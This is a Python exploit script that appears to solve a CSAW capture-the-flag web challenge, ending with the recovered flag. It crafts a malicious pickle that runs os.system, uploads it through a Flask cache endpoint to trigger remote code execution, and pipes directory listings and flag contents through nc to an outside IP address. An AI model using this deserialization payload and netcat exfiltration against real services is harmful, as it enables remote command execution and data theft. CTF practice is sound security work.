import requests
import pickle
import sys


# BASE_URL = 'http://localhost:5000/'
BASE_URL = 'http://web.chal.csaw.io:5000/'
CMD = "ls / | nc 153.126.161.91 9999"
# CMD = 'cat /flag.txt | nc 153.126.161.91 9999'


def solve():
    class Exploit(object):
        def __reduce__(self):
            import os
            return (os.system, (CMD, ))
    payload = b'!' + pickle.dumps(Exploit())
    with open('payload.bin', 'wb') as f:
        f.write(payload)
    params = {'title': 'flask_cache_view//test18', }
    files = {'content': open('payload.bin', 'rb'), }
    res = requests.post(BASE_URL, data=params, files=files)
    res = requests.get(BASE_URL + 'test18')
    print(res.text)


def main():
    solve()


if __name__ == '__main__':
    main()

# flag{f1@sK_10rD}
